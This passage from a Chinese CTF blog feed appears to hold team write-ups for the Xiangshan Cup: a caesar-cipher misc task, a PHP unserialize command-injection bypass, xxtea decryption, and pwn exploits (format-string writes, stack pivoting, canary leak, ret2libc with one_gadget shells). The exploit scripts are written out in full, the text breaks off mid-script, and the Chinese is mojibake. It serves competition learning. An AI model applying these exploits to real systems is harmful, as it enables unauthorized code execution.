<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libset(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libset(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">evgdb()</span><br><span class="line">rsetup(<span class="string">&#x27;47.104.24.40&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">stack = getx(-<span class="number">15</span>,-<span class="number">1</span>)</span><br><span class="line">stack1 = stack - <span class="number">8</span></span><br><span class="line">dx(stack1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹printfçš„è¿”å›åœ°å€</span></span><br><span class="line"></span><br><span class="line">sd(<span class="string">b&#x27;%4198556c&#x27;</span>+<span class="string">b&#x27;%19$paaa&#x27;</span>+<span class="string">b&#x27;aaa%9$n&#x27;</span>+p64(stack1))</span><br><span class="line"></span><br><span class="line">libc = getx(-<span class="number">65</span>,-<span class="number">51</span>)</span><br><span class="line">base = getbase(libc,<span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">243</span>)</span><br><span class="line">os = base + <span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line">os1 = os %<span class="number">0x10000</span></span><br><span class="line">os2 = os %<span class="number">0x1000000</span></span><br><span class="line">os2 = os2 &gt;&gt; <span class="number">16</span></span><br><span class="line">dx(stack)</span><br><span class="line">dx(os)</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">f&#x27;%<span class="subst">&#123;os2-<span class="number">4</span>&#125;</span>c&#x27;</span>.encode().ljust(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">pay2 = <span class="string">f&#x27;%<span class="subst">&#123;os1-os2-<span class="number">3</span>&#125;</span>c&#x27;</span>.encode().ljust(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pay1)</span><br><span class="line">pay = pay1 + <span class="string">b&#x27;a%11$hhn&#x27;</span>+ pay2 +<span class="string">b&#x27;aa%10$hn&#x27;</span> +p64(stack-<span class="number">232</span>)+p64(stack-<span class="number">230</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pay))</span><br><span class="line">pause()</span><br><span class="line">sl(pay)</span><br><span class="line">ia()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{such_@n_ea5y_fmt_9ame_f0r_y0u}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HASHTEAMé¦™å±±æ¯WP</title>
    <url>/posts/2611e12a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>æœ¬wpæ˜¯é˜Ÿå‹ä»¬å…±åŒåŠªåŠ›çš„ç»“æœï¼Œæ„Ÿè°¢.N1nEmAnã€HeyGapã€1cfhã€shuiã€hash_hashç­‰å¸ˆå‚…ã€‚</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>å°†é¢˜ç›®æ‰€ç»™ç¼–ç ä¸¢å…¥èµ›åšå¤§å¨ï¼Œå¾—åˆ°ç±»ä¼¼å‡¯æ’’å¯†ç çš„å­—ç¬¦ä¸²ã€‚</p>
<p><img data-src="https://s2.loli.net/2023/10/15/CcQBj3qFVfG4por.png" alt="image-20231015173916142.png"></p>
<p>å› ä¸ºflagæ ¼å¼ç¬¬ä¸€ä¸ªæ˜¯fï¼Œåˆ™å¯ä»¥ç¡®å®šå‡¯æ’’çš„åç§»ï¼Œå¾—åˆ°flagã€‚</p>
<span id="more"></span>

<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>æŸ¥çœ‹æºç ï¼Œå¾ˆæ˜¾ç„¶å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ã€‚</p>
<p><img data-src="https://s2.loli.net/2023/10/15/5mISwDTexlO9PpL.png"></p>
<p>ä½†æ˜¯è¿‡æ»¤äº†f l a g * ?ï¼Œéœ€è¦ç»•è¿‡ã€‚è¿™é‡Œé¦–å…ˆä½¿ç”¨<code>dir -1 /</code>æŸ¥çœ‹flagä½ç½®ï¼Œå‘ç°æ˜¯åœ¨ç¬¬äº”ä¸ªã€‚<br><img data-src="https://s2.loli.net/2023/10/16/QK4y5GvgnJfXl8h.png"><br>ç„¶åä½¿ç”¨<code>rev /$(dir -l / | sed -n 5p)</code>è¯»å–flagã€‚<br><img data-src="https://s2.loli.net/2023/10/16/WgVm8jUzdBN6fGO.png"><br>å¾—åˆ°ä¸€ä¸ªåå‘flagã€‚</p>
<p>å†æ¬¡åå‘å¾—åˆ°flagã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/ctf/match/xsb2023/web Â» rev flag                                                                                            N1nE@N1nEmAn</span><br><span class="line">flag&#123;8bab51a8-191e-4e78-8ca4-f1fc3fb6c018&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="URLä»å“ªå„¿æ¥"><a href="#URLä»å“ªå„¿æ¥" class="headerlink" title="URLä»å“ªå„¿æ¥"></a>URLä»å“ªå„¿æ¥</h2><p>è¿è¡Œé¢˜ç›®æ‰€ç»™çš„é™„ä»¶ï¼Œè®¾ç½®æ–­ç‚¹åœ¨â€ou.exeâ€æ‰€åœ¨å¤„ã€‚åœ¨ç›¸åº”æ–‡ä»¶å¤¹æ‰¾åˆ°ou.exeçš„ç›¸å…³æ–‡ä»¶ï¼Œç„¶åæ‹–å…¥idaã€‚<img data-src="https://s2.loli.net/2023/10/15/okIht1KHN2BYnJG.png"></p>
<p>è¿è¡Œou.exeæ–‡ä»¶ï¼Œå‘ç°åœ¨v18 +&#x3D; strlen(v18)å¤„ä¸‹æ–­ç‚¹ï¼Œæœç´¢flagå¯ä»¥å¾—åˆ°flagã€‚<img data-src="https://s2.loli.net/2023/10/15/EN1HQ9wIjrxizyL.png"></p>
<h2 id="hello-python"><a href="#hello-python" class="headerlink" title="hello python"></a>hello python</h2><p>äº†è§£åˆ°æ˜¯pythonå†™çš„apkï¼Œå®šä½æ‰€æœ‰ä¸ç»„ä»¶æ— å…³çš„åå‘ç°app.imyæ–‡ä»¶(ç”¨zipå¯ä»¥æ‰“å¼€)ï¼Œæ‰“å¼€æ˜¯ä¸ªxxteaï¼Œç›´æ¥è§£å¯†å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x = (x + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n - <span class="number">1</span>] = (v[n - <span class="number">1</span>] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = [<span class="number">689085350</span> ,<span class="number">626885696</span> ,<span class="number">1894439255</span> ,<span class="number">1204672445</span> ,<span class="number">1869189675</span> ,<span class="number">475967424</span> ,<span class="number">1932042439</span> ,<span class="number">1280104741</span> ,<span class="number">2808893494</span> ]</span><br><span class="line">k = [<span class="number">12345678</span> ,<span class="number">12398712</span> ,<span class="number">91283904</span> ,<span class="number">12378192</span> ]</span><br><span class="line">m = (decrypt(c, k))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(i)[<span class="number">2</span>:]).decode()[::-<span class="number">1</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">--------------------------------------------------------------------</span><br></pre></td></tr></table></figure>









<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h2><p>ä¸€é“ç®€å•çš„æ ˆè¿ç§»ã€‚ç¬¬ä¸€æ¬¡è¿ç§»åˆ°æ‰€ç»™çš„skddä¹‹åï¼Œæ³„éœ²putså‡½æ•°åœ°å€ï¼Œæ¥ç€è¿”å›åˆ°mainï¼Œç”±äºæ ˆå·²ç»è¢«è¿ç§»ï¼Œè¿”å›åœ°å€è¢«ç¯¡æ”¹ï¼Œæ­¤æ—¶ç›´æ¥è¾“å…¥one_shotï¼Œå³å¯è¿”å›åˆ°one_shotçš„åœ°å€ä¸Šï¼Œä»è€Œgetshellã€‚å…·ä½“çš„åœ¨æ³¨é‡Šã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"><span class="comment">#libset(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">rsetup(<span class="string">&#x27;101.201.35.76&#x27;</span>,<span class="number">29720</span>)</span><br><span class="line">evgdb()</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x401353</span></span><br><span class="line">lv = <span class="number">0x000000000040124b</span></span><br><span class="line">pay = p64(rdi) + p64(gotadd(<span class="string">&#x27;puts&#x27;</span>)) + p64(pltadd(<span class="string">&#x27;puts&#x27;</span>))+ p64(<span class="number">0x401264</span>)<span class="comment">#æ³„éœ²putsä¹‹åï¼Œè¿”å›åˆ°main</span></span><br><span class="line">sd(pay)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;ber&#x27;</span>,p32(<span class="number">0x12345678</span>))<span class="comment">#ç¬¦åˆåˆ¤æ–­ï¼Œæ‰§è¡Œæº¢å‡º</span></span><br><span class="line"></span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0x405098</span>)+p64(lv))<span class="comment">#æº¢å‡ºè¿›è¡Œæ ˆè¿ç§»åˆ°skdd</span></span><br><span class="line">addx = getx64(-<span class="number">7</span>,-<span class="number">1</span>)</span><br><span class="line">base = addx - <span class="number">0x80970</span></span><br><span class="line">sys = base + <span class="number">0x4f420</span></span><br><span class="line">binsh = base + <span class="number">0x1b3d88</span></span><br><span class="line">os = base + <span class="number">0x4f302</span></span><br><span class="line"><span class="comment">#è¾“å…¥oneshotï¼Œgetshell</span></span><br><span class="line">sl(p64(os))</span><br><span class="line"><span class="comment">#sd(p32(0x12345678))</span></span><br><span class="line"><span class="comment">#sd(b&#x27;a&#x27;*0x30+p64(0x405098)+p64(lv))</span></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>è¿™é“é¢˜ç›®çœ‹èµ·æ¥å¾ˆéº»çƒ¦ï¼Œå®é™…ä¸Šå‘ç°<code>app.cpython-37m-x86_64-linux-gnu.so </code>å°±æ˜¯cpythonï¼Œå°±æ˜¯pythonæ–‡ä»¶ç¼–è¯‘çš„æœ‰cpythonåº“å’Œlibcåº“çš„ä¸€é“é¢˜ã€‚</p>
<p>æ‰‹åŠ¨æµ‹è¯•ï¼Œå‘ç°æ¯æ¬¡è¾“å…¥ä¼šè¿”å›ä¸€ä¸ªä¸€æ¨¡ä¸€æ · çš„ä¸œè¥¿ï¼ŒçŒœæµ‹æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ç»“æœå‘ç°çœŸæœ‰ï¼Œç”±æ­¤æ³„éœ²canaryã€‚</p>
<p><img data-src="https://s2.loli.net/2023/10/15/TNGqlfdvkIcJwLR.png"></p>
<p>è§‚å¯Ÿåˆ°soæ–‡ä»¶ä¸­æœ‰Give you â€¦â€¦å­—ç¬¦ä¸²ï¼Œæ­¤å¤„å³æ˜¯åˆšæ‰è¿è¡Œçš„å‡½æ•°ï¼Œå‘ç°æœ‰æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p><img data-src="https://s2.loli.net/2023/10/15/pXufcVrYDHGwyLd.png"></p>
<p>æœ‰äº†æ ˆæº¢å‡ºå’Œcanaryï¼Œé‚£ä¹ˆç›´æ¥æ‰“ret2libcå³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setup(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">rsetup(<span class="string">&#x27;39.106.48.123&#x27;</span>, <span class="number">13099</span>)</span><br><span class="line">evgdb()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">addx = getx(-<span class="number">15</span>,-<span class="number">1</span>)</span><br><span class="line">base = addx - <span class="number">0x68b0</span></span><br><span class="line">dpx(<span class="string">&#x27;base&#x27;</span>, base)</span><br><span class="line">sl(<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">can = getx(-<span class="number">20</span>,-<span class="number">2</span>)</span><br><span class="line">dpx(<span class="string">&#x27;canary&#x27;</span>,can)</span><br><span class="line"></span><br><span class="line">rdi = base + <span class="number">0x0000000000003f8f</span></span><br><span class="line">flag = base + <span class="number">0x013B66</span></span><br><span class="line">rsi = base + <span class="number">0x0000000000003cd9</span></span><br><span class="line">puts = base + <span class="number">0x3710</span></span><br><span class="line">read = base + <span class="number">0x3940</span></span><br><span class="line">op = base + <span class="number">0x3ae0</span></span><br><span class="line">bss = base + <span class="number">0x16a80</span></span><br><span class="line">write = base + <span class="number">0x3760</span></span><br><span class="line">ret = base +<span class="number">0x000000000000301a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=(b&#x27;aaaaaaaa&#x27;*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))</span></span><br><span class="line">pay=(<span class="string">b&#x27;aaaaaaaa&#x27;</span>*<span class="number">0x20</span>+p64(can)*<span class="number">3</span>+p64(rdi)+p64(base+<span class="number">0x016078</span>)+p64(puts)+p64(base + <span class="number">0x99f0</span>))</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">libc = tet()</span><br><span class="line">libc = getx64(<span class="number">0</span>,-<span class="number">1</span>) - <span class="number">0x80970</span></span><br><span class="line">dpx(<span class="string">&#x27;libcbase&#x27;</span>, libc)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;aaaaaaaa&#x27;</span>*<span class="number">0x20</span>+p64(can)*<span class="number">3</span>+p64(rdi)+p64(libc + <span class="number">0x1b3d88</span>)+p64(ret)+p64(libc + <span class="number">0x4f420</span>)+p64(<span class="number">0xdeadbaef</span>))</span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>





<p>å‚è€ƒæ–‡ç« è¡¥å……ä¸€ä¸‹ï¼Œå®åœ¨ä¸çŸ¥é“æ€ä¹ˆè°ƒè¯•ã€‚æ‰“ç°ç›’å¥½ç´¯hhhã€‚</p>
<p><a href="https://www.cnblogs.com/ve1kcon/p/17766267.html">https://www.cnblogs.com/ve1kcon/p/17766267.html</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Pwthon</span><br><span class="line"></span><br><span class="line">python pwnï¼Ÿå®é™…ä¸Šä¹Ÿæ˜¯å»è·‘ c ç¨‹åºï¼Œä¸è¿‡è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§ã€‚å°è£…äº†ä¸€ä¸ª so åº“ï¼Œåœ¨ python ä»£ç ä¸­ä¼šå»è°ƒç”¨è¿™ä¸ªåº“çš„å‡½æ•°ï¼Œè¿™æ ·çš„è¯ï¼Œç›¸æ¯”èµ·å¸¸è§„ pwn é¢˜ï¼Œå°±æ˜¯ä¼šä¸å¥½å»è°ƒè¯•ã€‚å°†åº“æ–‡ä»¶ä¸¢è¿› ida åˆ†æï¼Œè¡¨é¢å¾ˆå¤æ‚ï¼Œæœ‰ç§åš vm é¢˜çš„æ„Ÿè§‰ï¼ˆbushi</span><br><span class="line"></span><br><span class="line">å®é™…ä¸Šåœ¨ç¬¬ä¸€ä¸ªè¾“å…¥ç‚¹è¾“å…¥<span class="number">0</span>å°±èƒ½è¿›å…¥åˆ° __pyx_f_3app_Welcome2Pwnthon å‡½æ•°äº†ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºï¼Œè€Œä¸”ç›´æ¥ç»™äº† _pyx_f_3app_get_info å‡½æ•°çš„åœ°å€ï¼Œå°±èƒ½å»è®¡ç®—è¿™ä¸ªåº“ç¨‹åºçš„åŸºåœ°å€äº†ï¼Œå…ˆæ³„ canaryï¼Œåé¢å°±æ˜¯ ret2libc æ¥ getshell äº†</span><br><span class="line"></span><br><span class="line">image</span><br><span class="line"></span><br><span class="line">æ¯”è¾ƒç‰¹åˆ«çš„ç‚¹å°±æ˜¯ __printf_chk å‡½æ•°ç›¸è¾ƒäºæ™®é€šçš„ printf å‡½æ•°ï¼Œä¸èƒ½ä½¿ç”¨ %N$ çš„å½¢å¼æ³„æ•°æ®ï¼Œç„¶åæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»æ˜¯<span class="number">5</span></span><br><span class="line"></span><br><span class="line">ï¼ˆåˆšå¼€å§‹å‘ç°åœ¨ä¸Šå›¾ä¸­ç¬¬ä¸€ä¸ª read å¤„ç›´æ¥æ•²ä¸ªå›è½¦æˆ–è€…å‘é€åˆšå¥½ <span class="number">0x100</span> å­—èŠ‚çš„æ•°æ®è¿‡å»ä¹‹åéƒ½èƒ½æ³„ç‚¹æ ˆæ•°æ®å‡ºæ¥ï¼Œæ¯”èµ›åšè¿™é“é¢˜æ—¶ç¢ç£¨äº†æŒºä¹…è¿™äº›æ•°æ®èƒ½æ€ä¹ˆç”¨ï¼Œå› ä¸ºå½“æ—¶æ²¡é…é€šæœ¬åœ°è¿è¡Œç¯å¢ƒï¼Œä¹Ÿä¸çŸ¥é“æ³„å‡ºçš„æ˜¯ä»€ä¹ˆæ•°æ®ï¼Œç„¶ååé¢å€’æ˜¯æ²¡ç”¨ä¸Šè¿™äº›æ•°æ®</span><br><span class="line"></span><br><span class="line">èµ›åæŠ˜è…¾äº†ä¸‹è¿è¡Œç¯å¢ƒï¼Œè¦å’Œä»–ç”Ÿæˆ .so ç”¨çš„ python3<span class="number">.7</span> ç‰ˆæœ¬ä¸€æ ·æ‰èƒ½è¿è¡Œï¼Œè¿™æ ·æ·»åŠ ä¸€ä¸‹ syspath å°±èƒ½ç›´æ¥ <span class="keyword">import</span> app äº†ï¼Œåœ¨è„šæœ¬ä¸­è¿gdbè°ƒè¯•çš„è¯æ˜¯è¿™æ ·å†™</span><br><span class="line"></span><br><span class="line">gdb.debug([<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;main.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line">æ–­ç‚¹æ–­åœ¨ PyImport_ImportModule+<span class="number">4</span>ï¼Œç„¶åä¸€ç›´å¾€ä¸‹è¿è¡Œçœ‹çœ‹é‚£ä¸ªåŒ…å¯¼å…¥äº† .so</span><br><span class="line"></span><br><span class="line">exp å¦‚ä¸‹</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;101.201.35.76&#x27;</span>, <span class="number">20611</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">s = p.recv(<span class="number">12</span>)</span><br><span class="line">get_info_addr = <span class="built_in">int</span>(s,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;get_info_addr: &quot;</span> + <span class="built_in">hex</span>(get_info_addr))</span><br><span class="line">libc_base = get_info_addr - <span class="number">0x68B0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5+(0x118-0x10)/0x8</span></span><br><span class="line">payload = <span class="string">&#x27;%p&#x27;</span>*<span class="number">37</span> + <span class="string">&#x27;flag&#x27;</span> + <span class="string">&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_canary = p.recv(<span class="number">16</span>)</span><br><span class="line">leak_canary = <span class="built_in">int</span>(leak_canary,<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak_canary: &#x27;</span> + <span class="built_in">hex</span>(leak_canary))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x3f8f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x3cd9</span></span><br><span class="line">main = libc_base + <span class="number">0x99F0</span></span><br><span class="line">puts_plt = libc_base + <span class="number">0x3710</span></span><br><span class="line">puts_got = libc_base + <span class="number">0x16078</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(leak_canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base2 = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;libc_base2: &#x27;</span> + <span class="built_in">hex</span>(libc_base2))</span><br><span class="line">binsh = libc_base2 + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system = libc_base2 + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span 